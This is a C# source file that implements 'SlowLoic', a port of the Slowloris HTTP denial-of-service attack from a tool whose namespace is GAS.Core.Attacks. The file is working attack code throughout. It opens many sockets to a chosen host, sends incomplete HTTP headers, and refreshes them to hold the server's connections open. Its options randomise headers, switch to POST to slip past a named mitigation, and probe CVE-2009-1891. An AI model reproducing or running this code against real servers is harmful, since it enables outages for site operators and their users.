using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.Tools;
using RandomStringGenerator.Helpers;

namespace GAS.Core.Attacks {
    /// <summary>
    /// SlowLoic is the port of RSnake's SlowLoris
    /// </summary>
    public class SlowLoic : IAttacker {
        private readonly string _dns;
        private readonly string _ip;
        private readonly string _subSite;
        private readonly int _port;
        private readonly int _nSockets;
        private volatile bool _random;
        private volatile bool _randcmds;
        private volatile bool _useget;
        private volatile bool _usegZip;
        private volatile bool _init;
        private readonly Thread[] _workingThreads;
        private volatile List<Socket>[] _lSockets;

        /// <summary>
        /// creates the SlowLoic / -Loris object.
        /// </summary>
        /// <param name="dns">DNS string of the target</param>
        /// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
        /// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
        /// <param name="subSite"></param>
        /// <param name="delay">time in milliseconds between the creation of new sockets.</param>
        /// <param name="timeout">time in seconds between a new partial header is sent on the same connection. the higher the better .. but should be UNDER the READ-timeout _from the server. (30 seemed to be working always so far!)</param>
        /// <param name="random">adds a random string to the subsite</param>
        /// <param name="nSockets">the amount of sockets for this object</param>
        /// <param name="randcmds">randomizes the sent header for every request on the same socket. (however all sockets send the same partial header during the same cyclus)</param>
        /// <param name="useGet">if set to TRUE it uses the GET-command - due to the fact that http-Ready mitigates this change this to FALSE to use POST</param>
        /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891</param>
        /// <param name="threadcount"></param>
        public SlowLoic( string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool randcmds, bool useGet, bool usegZip, int threadcount ) {
            this.ThreadCount = threadcount;
            this._workingThreads = new Thread[ this.ThreadCount ];
            this.States = new ReqState[ this.ThreadCount ];
            this._lSockets = new List<Socket>[ this.ThreadCount ];
            for ( var i = 0; i < this.ThreadCount; i++ ) {
                this.States[ i ] = ReqState.Ready;
                this._lSockets[ i ] = new List<Socket>();
            }
            this._dns = ( dns == "" ) ? ip : dns; //hopefully they know what they are doing :)
            this._ip = ip;
            this._port = port;
            this._subSite = subSite;
            this._nSockets = nSockets;
            if ( timeout <= 0 ) this.Timeout = 30000; // 30 seconds 
            else this.Timeout = timeout * 1000;
            this.Delay = delay;
            this._random = random;
            this._randcmds = randcmds;
            this._useget = useGet;
            this._usegZip = usegZip;
            this.IsDelayed = true;
            this.Requested = 0; // we reset this! - meaning of this counter changes in this context!
        }
        public override void Start() {
            this.IsFlooding = true;
            if ( this.IsFlooding ) this.Stop();
            this.IsFlooding = true;
            for ( var i = 0; i < this.ThreadCount; ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i++ ) ) {}
            this._init = true;
        }
        public override void Stop() {
            this.IsFlooding = false;
            foreach ( var x in this._workingThreads )
                try { x.Abort(); }
                catch (Exception) { }
        }
        private void bw_DoWork( object indexinthreads ) {
            #region wait 4 full init
            while ( !this._init ) Thread.Sleep( 100 );
            var myIndexForWork = (int) indexinthreads;
            #endregion
            #region attack
            try {
                #region header set-up
                var sbuf = System.Text.Encoding.ASCII.GetBytes( String.Format( "{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", this._subSite, Environment.NewLine, this._dns, ( ( this._useget ) ? "GET" : "POST" ), ( ( this._usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ) ) );
                var tbuf = System.Text.Encoding.ASCII.GetBytes( "X-a: b{\r\n" );
                this.States[ myIndexForWork ] = ReqState.Ready;
                DateTime stop;
                #endregion
                while ( this.IsFlooding ) {
                    stop = DateTime.Now.AddMilliseconds( this.Timeout );
                    this.States[ myIndexForWork ] = ReqState.Connecting; // SET STATE TO CONNECTING //
                    while ( this.IsDelayed && ( DateTime.Now < stop ) ) {
                        #region Headers
                        if ( this._random ) sbuf = System.Text.Encoding.ASCII.GetBytes(
                              String.Format(
                              "{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}",
                              this._subSite,
                              Environment.NewLine,
                              this._dns,
                              ( ( this._useget ) ? "GET" : "POST" ),
                              ( ( this._usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ) ) );
                        #endregion
                        #region Request
                        var socket = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
                        try {
                            socket.Connect( ( ( this._ip == "" ) ? this._dns : this._ip ), this._port );
                            socket.NoDelay = true;
                            socket.Blocking = false;
                            socket.Send( sbuf );
                        }
                        catch { }
                        #endregion
                        #region Check result
                        if ( socket.Connected ) {
                            this._lSockets[ myIndexForWork ].Add( socket );
                            this.Requested++;
                        }
                        this.IsDelayed = ( this._lSockets[ myIndexForWork ].Count < this._nSockets );
                        if ( this.IsDelayed && ( this.Delay > 0 ) ) Thread.Sleep( this.Delay );
                        #endregion
                    }
                    this.States[ myIndexForWork ] = ReqState.Requesting;
                    if ( this._randcmds ) tbuf = System.Text.Encoding.ASCII.GetBytes( "X-a: b" + Misc.RS() + "\r\n" );
                    #region keep the sockets alive
                    for ( var i = ( this._lSockets[ myIndexForWork ].Count - 1 ); i >= 0; i-- ) {
                        try {
                            #region Remove dead
                            if ( !this._lSockets[ myIndexForWork ][ i ].Connected || ( this._lSockets[ myIndexForWork ][ i ].Send( tbuf ) <= 0 ) ) {
                                this._lSockets[ myIndexForWork ].RemoveAt( i );
                                this.Failed++;
                                this.Requested--; // the "requested" number in the stats shows the actual open sockets
                            }
                            #endregion
                            else this.Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
                        }
                        #region Remove dead
                        catch {
                            this._lSockets[ myIndexForWork ].RemoveAt( i );
                            this.Failed++;
                            this.Requested--;
                        }
                        #endregion
                    }
                    #endregion
                    #region Stats
                    this.States[ myIndexForWork ] = ReqState.Completed;
                    this.IsDelayed = ( this._lSockets[ myIndexForWork ].Count < this._nSockets );
                    if ( !this.IsDelayed ) Thread.Sleep( this.Timeout );
                    #endregion
                }
            }
            catch { this.States[ myIndexForWork ] = ReqState.Failed; }
            #endregion
            #region Cleanup
            finally {
                this.IsFlooding = false;
                for ( var i = ( this._lSockets[ myIndexForWork ].Count - 1 ); i >= 0; i-- )
                    try { this._lSockets[ myIndexForWork ][ i ].Close(); }
                    catch { }
                this._lSockets[ myIndexForWork ].Clear();
                this.States[ myIndexForWork ] = ReqState.Ready;
                this.IsDelayed = true;
            }
            #endregion
        }
    }
}
